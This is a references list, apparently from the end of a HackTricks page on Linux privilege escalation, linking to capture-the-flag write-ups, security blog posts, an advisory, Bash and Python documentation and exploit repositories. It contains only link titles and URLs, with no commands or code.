- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
